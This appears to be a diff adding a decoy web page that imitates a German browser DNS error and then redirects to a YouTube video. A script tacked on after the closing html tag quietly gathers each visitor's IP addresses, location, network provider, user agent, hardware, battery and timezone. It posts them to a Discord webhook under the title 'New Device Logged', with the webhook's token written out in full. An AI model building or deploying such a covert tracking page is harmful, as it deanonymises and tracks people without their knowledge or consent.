@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="refresh" content="5; url=https://www.youtube.com/watch?v=_-2dIuV34cs">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200&icon_names=description" />
+  <meta charset="UTF-8">
+  <title>error</title>
+  <style>
+ body {
+            background-color: #1e1e1e;
+            color: #e8eaed;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            max-width: 600px;
+        }
+        .icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        p {
+            margin-bottom: 5px;
+            color: #9aa0a6;
+        }
+        a {
+            color: #8ab4f8;
+            text-decoration: none;
+        }
+        .button {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #7aafd8;
+            border: none;
+            color: rgb(0, 0, 0);
+            border-radius: 20px;
+            cursor: pointer;
+        }
+        
+        .material-symbols-outlined {
+          font-variation-settings:
+          'FILL' 0,
+          'wght' 300,
+          'GRAD' 0,
+          'opsz' 24
+        }
+        .icon {
+          scale: 2.5;
+          margin-bottom: 50px;
+        }
+
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="icon"><span class="material-symbols-outlined">description</span>
+    </div>
+    <h1>Die Website ist nicht erreichbar</h1>
+    <p>Prüfe, ob „example.com“ einen Tippfehler enthält.</p>
+    <p>Wenn die URL keinen Tippfehler enthält, <a href="#">kannst du die Windows-Netzwerkdiagnose durchführen.</a></p>
+    <p>DNS_PROBE_FINISHED_NXDOMAIN</p>
+    <a href="https://www.youtube.com/watch?v=_-2dIuV34cs">
+      <button class="button">Neu laden</button>
+    </a>
+    
+</div>
+</body>
+</html>
+
+<script>
+(async () => {
+  const params = new URLSearchParams(location.search);
+  const redirectUrl = params.get("link");
+  const uid = params.get("id");
+
+  if (!uid || !redirectUrl) return;
+
+  const [ipapiData, ipifyData] = await Promise.all([
+    fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({})),
+    fetch("https://api.ipify.org?format=json").then(res => res.json()).catch(() => ({})),
+  ]);
+
+  const ipv4 = ipifyData.ip || "error";
+  const ipv6 = (ipapiData.ip || "").includes(":") ? ipapiData.ip : "error";
+
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+  const now = new Date().toISOString();
+  const localTime = new Date().toString();
+
+  const battery = await navigator.getBattery?.().catch(() => null) || {};
+  const batteryLevel = battery.level != null ? `${Math.round(battery.level * 100)}%` : "N/A";
+  const isCharging = battery.charging != null ? (battery.charging ? "Yes" : "No") : "N/A";
+
+  const cpuCores = typeof navigator.hardwareConcurrency === "number" ? navigator.hardwareConcurrency : "N/A";
+  const ram = typeof navigator.deviceMemory === "number" ? `${navigator.deviceMemory} GB` : "N/A";
+
+  const info = {
+    title: "🎯 New Device Logged",
+    color: 0xff0000,
+    fields: [
+      { name: "ID", value: uid, inline: false },
+      { name: "IPv4", value: ipv4, inline: true },
+      { name: "IPv6", value: ipv6, inline: true },
+      { name: "ASN", value: ipapiData.asn || "N/A", inline: true },
+      { name: "Org", value: ipapiData.org || "N/A", inline: true },
+      { name: "City", value: ipapiData.city || "N/A", inline: true },
+      { name: "Region", value: ipapiData.region || "N/A", inline: true },
+      { name: "Country", value: ipapiData.country_name || "N/A", inline: true },
+      { name: "Timezone", value: timezone, inline: true },
+      { name: "Language", value: navigator.language || "N/A", inline: true },
+      { name: "Platform", value: navigator.platform || "N/A", inline: true },
+      { name: "User-Agent", value: navigator.userAgent.slice(0, 1024), inline: false },
+      { name: "Screen", value: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`, inline: true },
+      { name: "CPU Cores", value: cpuCores.toString(), inline: true },
+      { name: "RAM", value: ram, inline: true },
+      { name: "Touch Support", value: "ontouchstart" in window ? "Yes" : "No", inline: true },
+      { name: "Battery", value: `${batteryLevel} (Charging: ${isCharging})`, inline: true },
+      { name: "Dark Mode", value: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No", inline: true },
+      { name: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
+      { name: "Online", value: navigator.onLine ? "Yes" : "No", inline: true },
+      { name: "Local Time", value: localTime, inline: false },
+      { name: "Timestamp", value: now, inline: false },
+    ],
+  };
+
+  await fetch("https://discord.com/api/webhooks/1370807275530489857/ClzDyMcTwOA8RbaOa0w439F4V2U9v0prhH1c8CiLPaJoKG9MGnPBOip6MmgOAUvtXzgw", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ embeds: [info] }),
+  });
+
+  location.href = redirectUrl;
+})();
+</script>
